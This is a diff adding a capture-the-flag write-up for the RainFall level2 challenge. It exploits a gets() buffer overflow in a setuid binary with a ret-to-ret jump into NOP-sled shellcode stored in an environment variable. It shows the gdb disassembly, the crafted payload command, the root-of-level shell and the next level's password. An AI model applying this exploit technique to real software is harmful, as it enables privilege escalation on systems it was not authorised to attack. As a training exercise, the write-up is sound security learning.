@@ -1,0 +1,167 @@
+level2:
+--------------------------------------------------------------------------------
+level2@RainFall:~$ ls
+level2
+level2@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
+
+********************************************************************************
+This binary is owned by level3, and has the setuid permission for all users,
+which means that a shell launched by this program would provide us access to
+level3 permissions.
+********************************************************************************
+
+level2@RainFall:~$ ./level2 afasdf
+ajkshdfka
+ajkshdfka
+level2@RainFall:~$ gdb ./level2
+Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
+(gdb) disas main
+Dump of assembler code for function main:
+   0x0804853f <+0>:	push   %ebp
+   0x08048540 <+1>:	mov    %esp,%ebp
+   0x08048542 <+3>:	and    $0xfffffff0,%esp
+   0x08048545 <+6>:	call   0x80484d4 <p>
+   0x0804854a <+11>:	leave
+   0x0804854b <+12>:	ret
+End of assembler dump.
+(gdb) disas p
+Dump of assembler code for function p:
+   0x080484d4 <+0>:	push   %ebp
+   0x080484d5 <+1>:	mov    %esp,%ebp
+   0x080484d7 <+3>:	sub    $0x68,%esp
+   0x080484da <+6>:	mov    0x8049860,%eax
+   0x080484df <+11>:	mov    %eax,(%esp)
+   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
+   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
+   0x080484ea <+22>:	mov    %eax,(%esp)
+   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
+   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
+   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
+   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
+   0x080484fb <+39>:	and    $0xb0000000,%eax
+   0x08048500 <+44>:	cmp    $0xb0000000,%eax
+   0x08048505 <+49>:	jne    0x8048527 <p+83>
+   0x08048507 <+51>:	mov    $0x8048620,%eax
+   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
+   0x0804850f <+59>:	mov    %edx,0x4(%esp)
+   0x08048513 <+63>:	mov    %eax,(%esp)
+   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
+   0x0804851b <+71>:	movl   $0x1,(%esp)
+   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
+   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
+   0x0804852a <+86>:	mov    %eax,(%esp)
+   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
+   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
+   0x08048535 <+97>:	mov    %eax,(%esp)
+   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
+   0x0804853d <+105>:	leave
+   0x0804853e <+106>:	ret
+End of assembler dump.
+
+********************************************************************************
+We can see a gets call at p<+25>, which is vulnerable. However, an usual stack
+corruption with a shellcode is not possible here, because of an integrity check
+protection established between p<+39> and p<+51>. We need to find another way to
+execute code. Since we can't store the shellcode on the stack, we will copy it
+after multiple nop instructions into an environment variable called payload.
+The ret-to-libc attack allow us to execute this shellcode by placing the address
+of a ret instruction into the ip (instruction pointer) register (which will pop
+the stack, copying the following parameter into ip), followed by the address of
+a nop instruction into our payload environment variable. Theses nop instructions
+will be ignored, and our shellcode will be executed.
+Let's get the main function ret instruction address first.
+********************************************************************************
+
+level2@RainFall:~$ objdump -d level2 | grep -E7 "<main>"
+ 804852d:	e8 be fe ff ff       	call   80483f0 <puts@plt>
+ 8048532:	8d 45 b4             	lea    -0x4c(%ebp),%eax
+ 8048535:	89 04 24             	mov    %eax,(%esp)
+ 8048538:	e8 a3 fe ff ff       	call   80483e0 <strdup@plt>
+ 804853d:	c9                   	leave
+ 804853e:	c3                   	ret
+
+0804853f <main>:
+ 804853f:	55                   	push   %ebp
+ 8048540:	89 e5                	mov    %esp,%ebp
+ 8048542:	83 e4 f0             	and    $0xfffffff0,%esp
+ 8048545:	e8 8a ff ff ff       	call   80484d4 <p>
+ 804854a:	c9                   	leave
+ 804854b:	c3                   	ret
+ 804854c:	90                   	nop
+level2@RainFall:~$ echo "804854b" > /tmp/ret_addr
+
+
+********************************************************************************
+Then we have to retrieve the address of any nop instruction into the payload
+variable content. We will do this using gdb, and to avoid different environment
+variables addresses, we will use env -i to generate a similar environment for
+both gdb and binary executions. We will firstly get the address of the payload
+variable, then we will choose an arbitrary nop instruction after it.
+********************************************************************************
+
+level2@RainFall:~$ env -i payload=$(python /tmp/env_payload.py) gdb ./level2
+Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
+(gdb) disas main
+(gdb) b *main+12
+Breakpoint 1 at 0x804854b
+(gdb) r
+Starting program: /home/user/level2/level2
+aldkjhflakhjdf
+aldkjhflakhjdf
+
+Breakpoint 1, 0x0804854b in main ()
+(gdb) x/200xs environ
+...
+0xbffffb90:	 "payload=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
+...
+(gdb) x/200xg 0xbffffb90
+0xbffffb90:	0x3d64616f6c796170	0x9090909090909090
+0xbffffba0:	0x9090909090909090	0x9090909090909090
+0xbffffbb0:	0x9090909090909090	0x9090909090909090
+0xbffffbc0:	0x9090909090909090	0x9090909090909090
+0xbffffbd0:	0x9090909090909090	0x9090909090909090
+0xbffffbe0:	0x9090909090909090	0x9090909090909090
+0xbffffbf0:	0x9090909090909090	0x9090909090909090
+0xbffffc00:	0x9090909090909090	0x9090909090909090
+0xbffffc10:	0x9090909090909090	0x9090909090909090
+0xbffffc20:	0x9090909090909090	0x9090909090909090
+0xbffffc30:	0x9090909090909090	0x9090909090909090
+0xbffffc40:	0x9090909090909090	0x9090909090909090
+0xbffffc50:	0x9090909090909090	0x9090909090909090
+0xbffffc60:	0x9090909090909090	0x9090909090909090
+0xbffffc70:	0x9090909090909090	0x9090909090909090
+0xbffffc80:	0x9090909090909090	0x9090909090909090
+0xbffffc90:	0x9090909090909090	0x9090909090909090
+0xbffffca0:	0x9090909090909090	0x9090909090909090
+0xbffffcb0:	0x9090909090909090	0x9090909090909090
+0xbffffcc0:	0x9090909090909090	0x9090909090909090
+0xbffffcd0:	0x9090909090909090	0x9090909090909090
+0xbffffce0:	0x9090909090909090	0x9090909090909090
+
+level2@RainFall:~$ echo "0xbffffce0" > /tmp/payload_addr
+
+********************************************************************************
+Now we can create our payload, that will overwrite eip with a ret instruction
+address, by filling the buffer with 'a's until its end, and then write our ret
+address in the ip register space, followed by the address of our shellcode.
+As the instruction is a ret, it will pop the stack, placing our shellcode address
+in the instruction pointer (ip / eip).
+********************************************************************************
+
+level2@RainFall:~$ cat /tmp/ret_addr
+804854b
+level2@RainFall:~$ cat /tmp/payload_addr
+0xbffffce0
+level2@RainFall:~$ python -c "print('a' * 80 + '\x4b\x85\x04\x08' + '\xe0\xfc\xff\xbf')" > /tmp/payload
+level2@RainFall:~$ cat /tmp/payload - | env -i payload=$(python /tmp/env_payload.py) ./level2
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaKaaaaaaaaaaaaK����
+$ pwd
+/home/user/level2
+$ whoami
+level3
+$ cd ../level3
+$ cat .pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+--------------------------------------------------------------------------------
